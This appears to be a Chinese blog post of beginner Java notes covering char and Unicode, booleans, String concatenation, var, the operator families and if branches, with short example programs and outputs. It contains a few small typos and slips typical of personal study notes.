<p><strong>通过以上的分析实际上是许多的读者就应该发现一个比较熟悉的昌吉了，这个场景的内容就是常规的编程语言里面所出现ASCII码的内容（在整个计算机内部核心的组成就是”0”,”1”），但是需要描述的内容太多了，所以就需要对这些数值进行合理的安排，就可以基于不同的内容实现相应字符的显示</strong></p>
<pre><code>需要提醒读者的是，在使用java开发的时候后，所采用的并不是这种ASCII码，JAVA在其设计的时候已经充分的考虑了当前的开发市场（C、C++为主时代）所有的开发者都已经习惯于这样的编码顺序，那么在进行java编码的设计的时候就将传统的ASCII码包含在当前语言设计的编码当中，开发了属于JAVA自己的十六进制编码，该编码的名称为“UNICODE”。UNICODE是一个非常强大的编码，可以描述出世界上任意的文字，包括中文、日文等。</code></pre><p><em>范例：通过char保存中文</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        char c=  &apos;俊&apos;;//传统的ASCII码是不包含中文定义的
        int num = c;
        System.out.println(num);

    }
}</code></pre><blockquote>
<p>20426（这个数值已经远远超过了byte可能描述的数据范围）</p>
</blockquote>
<p>　　<em>UNICODE描述了一个更广阔的编码范围，其中也很好的支持有传统的AsCII编码，让所有的开发者在使用上不会产生任何的不适应感。由于字符可以保存中文，所以在日后进行网络数据传输的时候，如果要进行中文数据的处理，建议使用的就是char来进行操作。</em></p>
<h1 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h1><p>　　<em>布尔型是一种描述处理结果的逻辑内容，对于计算机的世界来讲除了真就是假，没有中间的过渡环节，布尔在java编程语言里面使用boolean关键字来进行定义，而布尔的取值只有两个内容：True、False（这两个在java中都属于有特殊含义的关键字）</em></p>
<p><strong>如果要想使用布尔类型进行程序的开发，往往都需要结合一些分支语句的结果进行使用</strong></p>
<p><em>范例：使用布尔型</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        boolean flag = true;
        if(flag){
            System.out.println(&quot;1&quot;);
        }
    }
}</code></pre><p>**　　如果此时设置flag的内容为false，那么对于当前的if判断就不会成立。既然已经谈到布尔数据类型就必须对一个语言的区别进行一些描述。**</p>
<p>　　<em>如果你使用的是C、C++编程开发，在这样的编程语言里面基本上强调都是通过数字0来描述FALSE，而通过一个非0的数字来描述TRUE，通过这样的数值来描述布尔值，但是在JAVA之中并不存在于这样的概念。</em></p>
<h1 id="String-字符串"><a href="#String-字符串" class="headerlink" title="String 字符串"></a>String 字符串</h1><p>　　<strong>在任何一门语言里面实际上字符串都属于一种比较特殊的类型，而JAVA之中字符串也属于非常特殊的一种数据形式，它不是基本数据类型，而它属于一种引用数据类型，因为字符串的类型要使用“String”声明，而在JAVA编写程序代码的过程之中已经明确强调了：首字母大写的一定是类，所以String是一个系统类（这个系统类的设计是非常繁琐的，后面会有专门的内容进行全面分析），本次先来观察一下String的基本使用</strong></p>
<p>　　<em>在程序里面如果要想描述单个字符肯定要使用char类型（通过“’”声明），但是如果要想描述一组的字符，就可以通过字符串的形式来处理。</em></p>
<p><em>范例：定义字符串</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String message = &quot;董俊&quot;;
        System.out.println(message);

    }
}</code></pre><blockquote>
<p>董俊</p>
</blockquote>
<p>**　　需要注意的是，每一个字符串实际上都可以进行内容的连接，而内容的连接，可以通过“+”来实现（不是数字的加法而表述的是一个连接操作）**</p>
<p><strong>范例：字符串连接操作</strong><br>        public class DongJun{<br>            static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>            public static void main(String DongJun[]){<br>                String message = “姓名：”;<br>                message =  “我的” + message ;<br>                System.out.println(message+”董俊”);</p>
<pre><code>    }
}</code></pre><p>　　<em>既然在字符串之中“+”属于连接的操作形式，所以这个时候就会存在有另外一个问题：如果现在直接与其他基本数据类型进行连接又会如何呢？</em></p>
<p><strong>范例：观察基本数据类型与字符串的连接</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String prompt = &quot;数据输出&quot;;
        System.out.println(prompt + 1);
        System.out.println(prompt + 1.1);
        System.out.println(prompt + &apos;Y&apos;);
        System.out.println(prompt + true);


    }
}</code></pre><blockquote>
</blockquote>
<p>数据输出1<br>数据输出1.1<br>数据输出Y（字符并没有变为数字，而是直接使用了原始的字符内容）<br>数据输出true</p>
<p><strong>以上仅仅是连接了一些基本数据型常量，那么如果说现在连接的是一些基本的计算表达式，那么请继续观察程序问题。</strong></p>
<p><em>范例：观察计算表达式问题</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        double num_a = 9.5 ;
        int num_b  = 3 ;
        System.out.println(&quot;数学计算:&quot;+num_a + num_b);
    }
}</code></pre><blockquote>
<p>数学计算：9.53（字符串连接）</p>
</blockquote>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        double num_a = 9.5 ;
        int num_b  = 3 ;
        System.out.println(&quot;数学计算:&quot;+(num_a + num_b));
    }
}</code></pre><blockquote>
<p>数学计算:12.5（先数学计算再连接）</p>
</blockquote>
<p>**　　之所以此时要强调这种问题的关键在于，在进行字符串处理的时候“+”和数学计算的“+”会有那么一些麻烦的表述，当java任何的数据类型与字符串进行连接的似乎还，所有的数据类型会首先变为字符串，按照此时的代码，首先执行的是“字符串+double变量”，自动转为String的字符串，而后这个字符串再通过“+”连接一个整型，这个时候的整型也会自动转为字符串，所以最终的计算就称为了一个字符串的连接操作，而加上了括号之后表示要先计算括号内部的数据加法（double类型），最后再与字符串进行连接操作（double自动转为了String）但是这些操作仅仅是发生在包含有“+”的概念上，如果使用的是其他的运算，例如使用的是“-”，那么该程序在编译的时候就会出错**</p>
<pre><code>另外需要提醒大家的是，在进行字符串定义的时候本身如果包含有一些特殊的内容肯定是无法直接定义的，所以在这样的情况下要想描述一些特殊标记的符号就要使用转义字符，常见的转义字符为：双引号（&quot;、“\&quot;”）、单引号（&apos;、“\&apos;”）、换行符(“\n”)、制表符（“\t”）。</code></pre><p><em>范例：观察转义字符</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String message = &quot;董俊\&quot;\n\\\t我的填&quot;;
        System.out.println(message);
    }
}</code></pre><p><strong>这些转义字符也就在基础学习的过程之中有些作用，主要可以让内容的输出更加好看一些，但是如果在实际上的开发里面用处不是特别大</strong></p>
<h1 id="var关键字"><a href="#var关键字" class="headerlink" title="var关键字"></a>var关键字</h1><pre><code>Java 本身属于一门静态变成语言，在进行各个变量定义的时候就必须明确的声明变量的类型以及变量的具体内容（JDK1.5之后的版本要求是在使用之前复制），但是随着当今时代编程语言的技术发展，对于编程语言的要求也开始变得更多，所以这个时候很多的语言就退出了一个所谓的推断式变量定义，后来java在JDK1.10版本之中正式引入了此机制，所以提供了一个新的var关键字，这个关键字主要用于进行变量的定义，并且会根据所赋予的内容进行自动类型的配置。</code></pre><p><strong>范例：观察var关键字的使用</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        var num_a = 10.2 ;//将自动推断num_a类型为double
        var num_b = 3 ;//将自动推断num_b类型为int
        System.out.println(num_a - num_b);

    }
}</code></pre><blockquote>
<p>7.199999999999999(这种精度问题可以忽略)</p>
</blockquote>
<pre><code>public class DongJun{ 
static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
public static void main(String DongJun[]){
    var num_a = 10.2 ;//将自动推断num_a类型为double
    var num_b = 3 ;//将自动推断num_b类型为int
    System.out.println(((Object)num_b).getClass());//class java.lang.Integer
    System.out.println(((Object)num_a).getClass());//class java.lang.Double

}
}</code></pre><p>**　　在使用var关键字的时候除了可以为其赋值为基本数据类型之外，也可以设置字符串变量。**</p>
<p>范例：定义字符串变量</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        var message  = &quot;董俊&quot;;
        System.out.println(message);

    }
}</code></pre><blockquote>
<p>董俊</p>
</blockquote>
<p>**　　于是这个时候就有人提出疑问了，按照现在的做法，感觉所有的变量都使用var定义实际上减少了我们对于关键字的记忆需求，为什么你又在这边强调不要去使用它呢？**</p>
<pre><code>个人总结两个缺点：
    缺点一：像传统C、C++、Java这样编程语言对于数据类型都是有非常严格的要求，所以其对应的数据类型如果写的非常明确，那么就适合于程序的编写与调试，而如果使用var直接定义，那么类型不明确，于是世界上有一种变量的声明格式采用的是加入数据类型的模式完成例如：“var double_num_a = 10.2;”

    缺点二：其他语言的var是真正的动态类型（随时可以改变变量所保存的数类型的），而Java之中只是提供了一个var样子而已（一旦定义了变量，并且已经推断出了类型之后，那么该变量所保存的类型不允许改变）。</code></pre><p><em>范例：错误的var操作</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        var num = 10.2;
        num = &quot;www.yootk.com&quot;;</code></pre><p>​<br>​        }<br>​    }</p>
<blockquote>
</blockquote>
<p>DongJun.java:5: 错误: 不兼容的类型: String无法转换为double<br>                num = “<a href="http://www.yootk.com&quot;" target="_blank" rel="noopener">www.yootk.com&quot;</a>;<br>                      ^<br>1 个错误<br>错误: 编译失败</p>
<p><strong>综合以上的结论来讲，var关键字这种所谓的数据类型推断于实际的开发意义确实不是很大，这种操作尽量慎用</strong></p>
<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><pre><code>编程语言的本质是在于数学的计算（包括整个计算机的组成都是依据数学公式“冯诺依曼”），如果我们现在的程序开发使用的还是低级语言（汇编语言），那么所有的开发者就必须进行大量的细节处理，计算机的基本组成为二进制的数据，所以对于正数、负数、小数都需要进行各种二进制的计算转换，才可以通过计算机进行处理，但是如果所有的开发代码都还保持着这些低级语言的开发环境，那么对于技术的发展是非常不利的。</code></pre><blockquote>
<p><strong>放低思维：在国内的互联网的历史上，百度肯定是作为一家搜索引擎的公司出现的，他自己有自己的开发技术，但是在早期的互联网时代之中，实际上为了便于上网出现了所谓的导航网站（早期的Yahoo）。</strong><br><strong>在国内的“hao123.com”，本身没有任何的技术难度，所以在这样的情况下，许多的初级网民就觉得非常好用，于是最终2000W卖给了百度.</strong></p>
</blockquote>
<p>*　　如果所有的程序中的数学计算都要求每一位开发者进行所有底层的处理转换，那么计算机的发展肯定无法前进，那么作为高级编程语言（C、C++、JAVA、Python等），就必须读这些数学计算进行一系列的简化处理，所以才提出了所谓的运算符的概念，通过各种运算符以及编译操作过程就可以简化所有的计算处理。*</p>
<pre><code>通过之前的学习实际上以及接触了两类运算符：
    |-赋值运算符：变量 = 内容（数据）、 变量 = 其他变量；
    |-数学运算符：+、-、*、/;
而除了以上可以见到的运算符之外，在Java程序之中依然还包括有许多的运算符，那么这些运算符基本的使用过程实际上和正常生活的数学逻辑是非常贴近的。</code></pre><p>**　　重要的运算符：四则运算、逻辑运算（大小关系）、三目运算、自增或自减运算，除了这些基本的运算符之外，实际上所有的运算符都有其运算优先级（先乘除后加减）**</p>
<p><strong>高手的编程</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int a = 10;
        int b = 20;
        int result = a++ - b++ * a - b-- /  ++b * ++a;
        System.out.println(result);

    }
}</code></pre><blockquote>
<p>-222(不要问为什么)</p>
</blockquote>
<pre><code>在你以后的开发生涯之中，如果你真的写出了这样代码，接手你代码的后续的开发者一定会跑路。

随着开发产业的不断发展，那么所谓的优秀的代码大部分都会有一种固定的特征：“全部编写简单按程序”，所有的代码可以像“1+1= 2”那样简单。</code></pre><h1 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h1><pre><code>数学运算符是整个运算符之中最接近于原生生活的一种运算符，利用数学运算符可以方便的实现四则运算（加、减、乘、除、模），除了标配的运算符之外还提供有简化运算符。

模（MOD）：在实际的项目开发过程里面，求模的意义可以实现数的批量控制，例如：每20个人站为一组</code></pre><p>范例：通过求模的方式进行批量处理</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int currentNumber  = 20 ; //定义变量
        int result = currentNumber % 20; // 如果先currentNuumber不是20，则模的结果一定不是0
        System.out.println(&quot;运算结果：&quot;+result);

    }
}</code></pre><blockquote>
<p>运算结果： 0</p>
</blockquote>
<pre><code>对于求模的操作可能比较接近于当前基础环境的就只有一个常用的功能了：判断奇偶数（奇数模2为1，偶数模2为0）</code></pre><p><strong>实现奇偶数判断</strong></p>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写<br>        //Java中类的定义规则：每一个单词的首字母必须大写<br>        int number =  3; // 定义变量<br>        int result   = number % 2 ;<br>        System.out.println(“运算结果：”+result);<br>    }<br>}</p>
<blockquote>
<p>运算结果：1（现在判断的数字是一个奇数）</p>
</blockquote>
<p><strong>范例：简化运算符</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int numberA =  33; // 定义变量
        int numberB =  33; // 定义变量
        int numberC =  33; // 定义变量
        int numberD =  33; // 定义变量
        int numberE =  33; // 定义变量
        numberA += 5;
        numberB -= 5;
        numberC *= 5;
        numberD /= 5;
        numberE %= 5;
        System.out.println(&quot;运算结果A：&quot;+numberA);
        System.out.println(&quot;运算结果B：&quot;+numberB);
        System.out.println(&quot;运算结果C：&quot;+numberC);
        System.out.println(&quot;运算结果D：&quot;+numberD);
        System.out.println(&quot;运算结果E：&quot;+numberE);
    }
}</code></pre><blockquote>
</blockquote>
<p>运算结果A：38<br>运算结果B：28<br>运算结果C：165<br>运算结果D：6<br>运算结果E：3</p>
<h1 id="自增与自减运算符"><a href="#自增与自减运算符" class="headerlink" title="自增与自减运算符"></a>自增与自减运算符</h1><pre><code>在Java运算符里面针对于数学运算提供有“++”（自增运算，每一次调用内容都会“+1”处理）、“--”（自减运算，每一次调用内容都会“-1”处理），那么首先先来观察一下这两个运算符的基本使用。</code></pre><p><strong>范例：使用自增</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int num = 10 ; 
        System.out.println(&quot;原始num变量内容:&quot; + num);
        num++;//num+ = 1，但是性能要更高
        System.out.println(&quot;自增后num变量内容:&quot; + num);
    }
}</code></pre><blockquote>
</blockquote>
<p>原始num变量内容:10<br>自增后num变量内容:11</p>
<p>**　　当执行了自增操作之后，原始内容会增加1**<br>以上见到的自增是我们在实际开发中最为推荐的操作方法，但是对于当前自增或者是自减运算又会根据位置的不同而有所不同，主要是发生在执行顺序上。</p>
<pre><code>自增
&quot;变量 ++&quot;：先计算后累加
&quot;== 变量&quot;：先自增再计算
自减
&quot;变量 --&quot;：先计算后自减
&quot;-- 变量&quot;：先自减再计算</code></pre><p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写<br>        //Java中类的定义规则：每一个单词的首字母必须大写<br>        int numA = 10;<br>        int numB = 5;<br>        int result = numA + numB++;<br>        System.out.println(“计算结果:” + result);<br>        System.out.println(“numA=” + numA + “、numB=”+ numB);<br>    }<br>}</p>
<blockquote>
<p>计算结果:15<br>numA=10、numB=6</p>
</blockquote>
<p><strong>以上就实现了自增和自减</strong></p>
<h1 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h1><pre><code>在程序设计之中对于数据的关系基本上就是：&gt;, &lt;, &gt;=, &lt;=, （不等于）!=, （等于）==
这些关系运算符可以直接应用在数值的描述上（字符本身也是可以与整数进行自动转换，所以字符上也可以使用。）</code></pre><p><strong>范例：比较两个数字的大小关系</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int zsAge =  10 ;
        int lsAge =  20 ;
        boolean result = zsAge &gt; lsAge;
        System.out.println(result);
    }
}</code></pre><blockquote>
<p>False</p>
</blockquote>
<p><em>所有的关系运算符计算完成之后的数据类型是布尔类型（它的取值范围（True、False））</em></p>
<p><strong>范例：实现浮点型数据比较</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int zsAge =  10 ;
        int lsAge =  20 ;
        boolean result = zsAge &gt; lsAge;
        System.out.println(result);
    }
}</code></pre><blockquote>
<p>true</p>
</blockquote>
<p>**　　直接利用数值的比较是在进行关系运算符处理过程之中最为常见的数据类型，但是千万不要忘记了，由于java程序本身使用了十六进制的UNICODE编码，所以所有的字符内容都可以转为十进制数字。**</p>
<p><strong>范例：字符和整数进行比较</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        char name = &apos;董&apos;;//中文都是有编码
        System.out.println(name == 33891);

    }
}</code></pre><blockquote>
<p>true</p>
</blockquote>
<pre><code>不同的数据类型彼此发生数据大小比较之后一定要发生转型问题，如果转型失败（这种明面上的数据类型，如果真有转型失败的问题，那么编译器会直接告诉使用者可能出现的语法错误）那么一定无法进行比较，所以本次字符一定是首先自动的转为整型，而后利用整型数值进行相等的判断。</code></pre><p><strong>范例：布尔型的相等和不等判断</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        boolean flagA = true;
        boolean flagB = false;
        System.out.println(flagA == flagB);
        System.out.println(flagA != flagB);

    }
}</code></pre><blockquote>
</blockquote>
<p>false<br>true</p>
<pre><code>由于布尔数据类型的取值范围的定义，所以在使用关系运算符进行布尔数据类型判断的时候，只能够使用相等和不等两个运算符。，而其他的关系运算符将无法使用。</code></pre><h1 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h1><pre><code>如果同学们仅仅是在基础课程的学习过程之中实际上是很难感受到三木运算符的优势（在日后进行代码开发的过程里面，三目运算符相当的好用，同时可以帮助所有的人解决许多的代码冗余的问题）。
|- 三目运算符的本质相当于是一个带有判断的赋值运算符， 传统的赋值运算符能够设置的内容基本上就是变量或者常量，它采用都是比较直白的模式</code></pre><p>**　　如果某些值需要有条件的进行赋予则就必须进行一些关系运算符的判断处理了，当符合于某些判断条件的时候赋值，如果不符合赋予另外一个数值，而这个过程就属于三目运算符的操作，该操作的基本语法形式如下。**</p>
<pre><code>语法形式：[数据类型] 变量 = 判断条件 ? 条件满足时复制内容：条件不满足时赋值内容;</code></pre><p><strong>范例：观察三目运算符的使用</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int ageA = 10;
        int ageB = 15;
        int maxAge = ageA &gt; ageB ? ageA : ageB;
        System.out.println(maxAge);
    }
}</code></pre><blockquote>
<p>15</p>
</blockquote>
<blockquote>
<p><strong>对于此时的三目运算符相当于使用了一个if分支语句进行判断处理操作。</strong></p>
</blockquote>
<p><em>范例：三目等价于if、else判断</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int ageA = 10;
        int ageB = 15;
        int maxAge = 0;
        if (ageA &gt; ageB)
        {
            maxAge  = ageA;
        }
        else {
            maxAge  = ageB;
        }
        System.out.println(maxAge);
    }
}</code></pre><blockquote>
<p>最终输出结果同上</p>
</blockquote>
<pre><code>实际上在所有的运算符使用的过程之中都是可能存在有嵌套关系的，下面实现一个三目运算的嵌套处理。</code></pre><p><em>范例：实现三目运算的嵌套</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int ageA = 10;
        int ageB = 15;
        int ageC = 18;
        int maxAge = ageA &gt; ageB ? ageA : ageB &gt; ageC ? ageB : ageC ;
        System.out.println(maxAge);

    }
}</code></pre><blockquote>
<p>18</p>
</blockquote>
<p>**　　对于此时的程序的操作结构实际上是不便于阅读的，提倡编写简单代码。**</p>
<h1 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h1><pre><code>逻辑运算主要描述的是与或非这样的基本关系，使用逻辑运算符最终的特点在于可以同时连接多个判断条件。
例如：在之前使用的关系运算符，每一次只能够进行一个条件的判断，这样的操作一定不适合于更加复杂的程序逻辑。

逻辑运算符
----------------------------------------------------------
|-与（&amp;普通与和&amp;&amp;短路与）：若干个判断条件同时为true，最终程序结果才是true;
|-或：(|普通或||短路或)若干个判断条件有一个为true，最终程序运算的结果就是true;
|-非：（！）true变为false、false变true。
---------------------------------------------------------------------------------</code></pre><p>**　在给出的逻辑运算符之中非运算的理解可以说是最简单的了，因为仅仅是进行了布尔求反而已**</p>
<p><em>范例：观察与逻辑</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int x = 1;
        int y = 1;
        System.out.println(x == y &amp; 2 &gt; 1);
        System.out.println(x == y &amp; 2 &lt; 1);


    }
}</code></pre><blockquote>
</blockquote>
<p>true<br>false</p>
<p>**　　与的概念虽然很好理解，但是在java里面却针对于逻辑操作提供有两种不同的运算“&amp;”、“&amp;&amp;”，那么这两种运算有什么区别呢。**</p>
<p>范例：观察普通与存在的问题</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        // 按照高等数学的逻辑来理解“数字/0 = 无求大（计算机的设计来讲无求大意味着内存占满）”
        System.out.println((1 &gt; 2) &amp; 10 / 0 ==0);



    }
}</code></pre><blockquote>
</blockquote>
<p>Exception in thread “main” java.lang.ArithmeticException: / by zero<br>        at DongJun.main(DongJun.java:7)</p>
<p>*这个时候的程序出错实际上意味着所有的判断条件都执行了，但是现在来分析一个问题：对于与操作的逻辑来讲，最大的特点是若干个判断条件如果有一个条件为False，那么最终的与逻辑的结果全部为false（中间出现多少个true都没有意义了）。 *</p>
<pre><code>如果现在使用的是“&amp;”操作意味要全部判断
想要解决程序逻辑判断的性能问题，最佳做法就是使用短路与进行操作。</code></pre><p><strong>范例：短路与进行操作</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        // 按照高等数学的逻辑来理解“数字/0 = 无求大（计算机的设计来讲无求大意味着内存占满）”
        System.out.println((1 &gt; 2) &amp;&amp; 10 / 0 ==0);
        //第一个判断条件（1&gt;2）结果为false，后面的判断没有意义了直接停止判断，返回false




    }
}</code></pre><blockquote>
<p>false</p>
</blockquote>
<p><strong>范例：观察普通或</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        // 按照高等数学的逻辑来理解“数字/0 = 无求大（计算机的设计来讲无求大意味着内存占满）”
        System.out.println((1 == 2) | (10 / 0 ==0));
        //第一个判断条件（1&gt;2）结果为false，后面的判断没有意义了直接停止判断，返回false




    }
}</code></pre><blockquote>
</blockquote>
<p>Exception in thread “main” java.lang.ArithmeticException: / by zero<br>        at DongJun.main(DongJun.java:7)</p>
<p><em>范例：使用短路或</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        // 按照高等数学的逻辑来理解“数字/0 = 无求大（计算机的设计来讲无求大意味着内存占满）”
        System.out.println((1 == 1) || (10 / 0 ==0));
        //第一个判断条件（1&gt;2）结果为false，后面的判断没有意义了直接停止判断，返回false




    }
}</code></pre><blockquote>
<p>true</p>
</blockquote>
<pre><code>经过以上分析可以得到一个结论，考虑到执行性能的问题，一定要使用短路与、短路或进行若干操作。</code></pre><h1 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h1><pre><code>为了提升程序的数据处理性能，在任何的语言里面都提供有位运算符，在很多的项目开发之中一般的开发人员很难见到位运算具体的操作（大部分的位运算都出现在一些比较底层的开发过程之中），java中支持的位运算的类型有：&amp;（位与）、|（位或）、^（异或）、~（反码）、&lt;&lt;（左移）、&gt;&gt;（右移）、&gt;&gt;&gt;（无符号右移）。

如果要想使用位运算，处理的逻辑为：数字除2取余，一直除0为止，最后将所有的余数倒叙取出，下面来分析一下如何将十进制的13数字转为二进制。

面试题：请解释“&amp;”和“&amp;&amp;”的区别？
    - 对于“&amp;&amp;”主要应用在逻辑运算中，表示短路与操作，在进行若干个条件判断的时候，如果有条件返回了false，那么后续的条件都不判断，最终的判断的结果就是false；
    - 对于“&amp;”有两种使用环境：
        |- 逻辑运算：表示所有的判断条件都会执行，不管是否遇见有返回false的判断条件；
        |- 位运算：表示进行位与的计算，如果两位的内容都是1结果才是1，如果有一位是0，那么位与的结果就是0；</code></pre><h1 id="程序的逻辑结构"><a href="#程序的逻辑结构" class="headerlink" title="程序的逻辑结构"></a>程序的逻辑结构</h1><pre><code>|- 实际上程序本身是有自己完善的逻辑性，而且从程序设计角度来讲，程序的逻辑一共分为三种逻辑：顺序结构、分支结构、循环结构。
|- 在面对程序的时候后我们就相当于“程序的上帝”，你规定了某一个程序的功能，某一个程序的处理的逻辑，所谓的程序逻辑就相当于通过自己的想法，为程序规划路线。</code></pre><h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><pre><code>所有的程序都有可能根据一些内容动态的判断是否要执行某些代码，这样的处理逻辑就称为分支逻辑，在程序的开发之中分支逻辑分为两种类型：if分支（逻辑条件判断）、switch开关语句（数值判断）。</code></pre><h2 id="if-分支结构"><a href="#if-分支结构" class="headerlink" title="if 分支结构"></a>if 分支结构</h2><pre><code>if如果直接翻译为中文的话为“如果”的含义，在使用if语句进行判断的会说话必须判断是布尔型的处理结构，针对if语句有如下是那种操作结构：
|- if (布尔表达式) { 
    当布尔表达式成立时执行语句
}

|- if (布尔表达式) { 
    当布尔表达式成立时执行语句
} else {
    条件不满足时执行语句
}

|- if (布尔表达式) { 
    当布尔表达式成立时执行语句
} else if (布尔表达式){
    当布尔表达式成立时执行语句
}……else{
    条件不满足执行
}</code></pre><p><strong>范例：学生成绩分支</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        double score = 190.00 ;
        if (score &gt;= 90.00 &amp;&amp; score &lt;= 100)
        { 
            System.out.println(&quot;优等生&quot;);
        } else if (score &gt;= 60 &amp;&amp; score &lt; 90)
        {
            System.out.println(&quot;良等生&quot;);
        } else {
            System.out.println(&quot;差等生&quot;);
        }
    }
